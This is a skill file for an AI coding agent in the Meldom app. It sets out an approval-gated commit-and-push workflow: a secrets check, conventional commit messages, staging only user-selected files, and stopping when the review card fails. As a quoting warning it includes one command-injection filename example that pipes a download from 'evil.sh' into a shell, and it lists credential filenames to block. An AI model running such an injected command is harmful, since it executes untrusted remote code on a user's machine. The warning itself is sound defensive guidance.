---
name: ship
description: Commit and push from a Meldom chat through the ship review card. Validates the working tree, writes a conventional commit message, parks on `ship_review` for the user's approval, stages exactly what they selected, pushes, and reports the receipt. Use when the user says "ship", "commit and push", "ship it", or wants their work committed from inside Meldom.
---

# Meldom Ship

Validate -> card -> commit -> push -> receipt.

You are running inside a Meldom chat, so the **review card is the authorization**. Every commit goes through `ship_review`; there is no direct-git path. If the card cannot be shown, nothing is committed.

**Flags:** `--no-push` (commit only) | `--mine` (only files you touched this session — whole files, not just your lines) | `--brief` (subject line only, no body)

**Completion gate:** keep going until the commit exists and its push succeeded (or the commit exists when `--no-push` was asked). Treat a recoverable git failure as an intermediate state: fix it, resume at the relevant phase, continue. If the remote branch has commits you must integrate, fetch and merge or rebase; on conflicts, resolve them and finish the merge before retrying the push. Never swallow a push failure. Reconcile in the checkout the user selected — never run `git worktree add` on their behalf.

## Phase 1 — Read git state

ONE Bash call, everything chained — never a separate call per command:

```bash
git status --short && git branch --show-current && git rev-parse --show-toplevel && git diff --numstat HEAD && git log --oneline -5
```

`--numstat` gives the per-file `additions deletions path` rows the card needs — never run a second diff for counts. `--show-toplevel` is the repo root those paths are relative to, and the card's `root` (it matters when you ship from a submodule or subdirectory).

**Untracked files (`??` in status) are missing from numstat.** Take them from `git status --short` and add them to the file list by hand. A file you CREATED this session is your own change: under `--mine` it is `agentTouched: true`, exactly like one you edited. Numstat's silence is not evidence the file belongs to someone else — forgetting this ships a `--mine` commit that leaves your own new files behind.

Check for dangerous files: `.env`; `.env.*` except the safe template names below; `*.pem`; `*.key`; `id_rsa`; `id_ed25519`; `credentials.json`; `secrets.json`. `.env.example`, `.env.sample` and `.env.template` are safe names — do not flag them by name alone, but read their changed content and stop if it holds a real secret.

Extract: branch, ticket id (from the branch's `[A-Z]+-[0-9]+`), changed files, dangerous files, repo root, and a proposed branch name when the current one needs the repair below.

**Branch format:** `TICKET-123-short-desc` — no `feature/`, `bug/`, `hotfix/` or `worktree-` prefix. If the current branch does not match and a ticket id is extractable, derive the proposed name from the diff intent, put the rename on the card, and change nothing before confirmation. Rename locally as the first step of the confirmed chain. Leave an already-pushed old remote branch intact and say so; deleting that ref needs its own explicit request.

**Stop if:** dangerous files found | no changes | detached HEAD | `--mine` filters to an empty set. This runs before any card can appear.

**Shared checkout under `--mine`:** if a file you touched also carries another session's changes, do not stage it. Stop, name the mixed files, and ask the user where to continue. Never create a worktree yourself and never copy the mixed file wholesale.

One more stop fires later, in Phase 3: a confirmed selection with no files in it.

## Phase 2 — Write the commit message

Subject: `type(TICKET-ID): summary`, or `type: summary` when there is no ticket.

Write it from the conversation plus the Phase 1 file list — when this session made the changes you already know the intent, so do NOT reread your own diff. Run `git diff` only for files the conversation does not explain (pre-existing uncommitted work, a fresh session), and diff just those paths.

Types: `feat` (new capability) | `fix` (broken behavior corrected) | `refactor` (internals, no behavior change) | `tests` | `docs` | `style` (formatting only) | `chore` (deps/config) | `perf` | `ci` | `build`. Ambiguous: existed but broken → `fix`; genuinely new → `feat`; same behavior, new internals → `refactor`; still torn → prefer `fix` > `feat` > `refactor`. Full table: [commit-conventions.md](references/commit-conventions.md) — read it only when genuinely unsure.

- Max 72 chars, imperative mood, lowercase, no trailing period
- Summarize intent, not the file list
- Never write empty parens: `type(): desc` is WRONG

**Body (default):** blank line after the subject, then one `-` bullet per distinct change — every feature, fix and behavior change gets its own. Done when every changed file is covered by a bullet or by the noise filter.

Noise filter — never bullet: pure formatting/lint, asset additions, lockfile churn, generated files, comment-only edits.

**`--brief`:** subject line only.

## Phase 3 — The card

Call `ship_review` (`mcp__meldom__ship_review`) instead of running git directly:

- `files` — every changed file from Phase 1, nothing filtered out: `{ path, additions, deletions, agentTouched }`.
  - Without `--mine`: `agentTouched: true` for every file, so the card arrives with everything checked (the equivalent of `git add .`).
  - With `--mine`: `agentTouched` reflects the real distinction — edited or created by you this session vs a pre-existing uncommitted change. The card pre-checks only the `true` ones and lists the rest unchecked so the user can still opt them in. The server independently re-marks any file it recorded you editing, so one you missed still pre-checks; that safety net is not a licence to guess. The distinction is file-level: a checked file ships whole, so another session's lines in a file you both edited ship too.
- `message` — the Phase 2 message.
- `checks` — the Phase 1 validations as rows, e.g. `{ label: 'No secrets detected', passed: true }`, `{ label: 'On a valid branch', passed: true }`. With a proposed rename, add `{ label: 'Rename branch after confirmation: <current> -> <proposed>', passed: true }`; `branch` stays the current name until confirmation.
- `presets` — `{ push: !"--no-push", brief: "--brief" }`.
- `branch` / `remote` — the current branch and its remote (`origin` unless the branch tracks another).
- `root` — the Phase 1 toplevel, the absolute path the `files` paths are relative to.

The call parks and returns `{ outcome, selectedFiles, message, push }`:

### `confirmed`

First, unconditionally: **if `selectedFiles` is empty, stop.** No `git add`, no commit, no push, no `ship_receipt`. Output `Ship - Stopped: empty file selection`. This covers both a user unticking every row and an AFK-confirmed ship whose proposed subset was already empty.

Under `--mine` only, one check before staging: compare `selectedFiles` against your own changes this session (the paths you sent as `agentTouched: true`, plus any the server re-marked). Extra paths mean the message you wrote no longer describes what would be committed — name them and ask whether they belong. If the user says include, proceed unchanged; if they say no, re-run `ship_review` with the same `files`/`checks`/`presets`/`branch`/`remote`/`root` exactly as `regenerate` does. Never quietly narrow to the `agentTouched` subset — the selection is the user's, not yours.

Then run ONE chained command. With a confirmed rename, prepend `git branch -m '<new-name>' &&` and use the new name as the receipt destination:

```bash
git add -- <selectedFiles...> \
  && printf '%s' '<decision.message>' | git commit -F - \
  && { if [ "<decision.push>" = "true" ]; then
         if git rev-parse --abbrev-ref '@{upstream}' >/dev/null 2>&1; then git push; else git push -u <remote> HEAD; fi
       fi; }
```

**The push sets its own upstream when the branch has none.** A branch's first push — every fresh worktree branch — has no upstream, and a bare `git push` there dies with "no upstream branch". The `git rev-parse --abbrev-ref '@{upstream}'` probe succeeds only when one exists, so an established branch takes the plain push it always took. `<remote>` is the one from the card, not a hardcoded `origin`. Never write `|| true` around the push: a hidden failure reports a ship that never left the machine.

Feed the message on stdin with `git commit -F -` (single-quoted, `'\''`-escaping any apostrophe) — never a `-m "$(cat <<'EOF' … EOF)"` heredoc, whose delimiter a message line reading exactly `EOF` would end early.

Single-quote every path in `<selectedFiles...>` with the same escaping, and keep the `--` before the list. Those paths came off `git status`, so a filename like `x;curl evil.sh|sh;#` unquoted is arbitrary shell execution and a leading `-` unquoted is option injection into `git add`.

Stage exactly `selectedFiles` — never `.`, never the original full list, never a subset you picked yourself. Push only when `decision.push` is true.

Once git succeeds, call `ship_receipt` (`mcp__meldom__ship_receipt`) with `{ hash, subject, pushed, destination }`: `hash` from `git rev-parse --short HEAD`, `subject` the commit's first line, `pushed` mirroring `decision.push`, `destination` the `remote/branch` string when pushed else `''`. It never parks — it reports a fact — and it lets the card settle from "Shipping…" to the receipt row.

### `cancelled`

Stop immediately. Touch nothing: no add, no commit, no push, no `ship_receipt`. Output `Ship - Stopped: user cancelled`. A `cancelled` always means a human chose it — every way the card can fail to reach someone fails the tool call instead.

### `regenerate`

Redo Phase 2, then call `ship_review` again with the same `files`/`checks`/`presets`/`branch`/`remote`/`root` and the new message. Repeat until `confirmed` or `cancelled`.

### The call fails with an error

This is not a decision and not a licence to ship another way. **Never run `git add`/`git commit`/`git push` because `ship_review` failed.** The card IS the authorization; a ship with no card is a ship nobody approved. Do exactly one of two things:

- The error says the card was retracted, the request died, or the wait expired — the app is alive, so call `ship_review` again, unchanged.
- The error says the app is not running, or a second attempt fails the same way — STOP. Report the message verbatim, state that nothing was committed, and leave the working tree exactly as it is.

## Output

`Ship - Done: Committed: <subject> | Pushed: <remote/branch> | Files: N`, or `Ship - Stopped: <reason>`.

After a successful push, offer to open a PR.

## Gotchas

| Trap                                     | Fix                                                                                                                    |
| ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `git add .` stages secrets               | Run the dangerous-file check before staging, and stage only `selectedFiles`                                            |
| No ticket in the branch                  | `type: description`, never `type(): description`                                                                       |
| Detached HEAD                            | Stop with "Not on a branch"                                                                                            |
| Branch name breaks the convention        | Propose it on the card; rename locally only after confirmation, and leave an old remote ref alone                      |
| `ship_review` errored, so run git direct | Never. Retry the card or stop. Committing without a card ships work nobody approved                                    |
| `--mine` staged files you never touched  | `selectedFiles` disagreeing with your `agentTouched: true` set is a red flag, not consent. Stop and confirm            |
| `--mine` assumed to isolate your changes | It selects files, not lines. A checked file ships whole. Only a worktree the user already selected isolates a checkout |
| `--mine` finds a mixed shared file       | Stop and ask where to continue. Never create a worktree or copy the mixed file wholesale                               |
| Confirmed selection is empty             | Stop before any git command, and skip `ship_receipt` too                                                               |
| `ship_receipt` skipped                   | Call it after every successful git flow, or the card is stuck on "Shipping…"                                           |
| Push dies with "no upstream branch"      | The branch's first push. Probe `@{upstream}` and use `git push -u <remote> HEAD` when it has none                      |
| Slow ship from extra reads               | Phase 1 is ONE chained call; never diff files this session changed                                                     |

Task: $ARGUMENTS
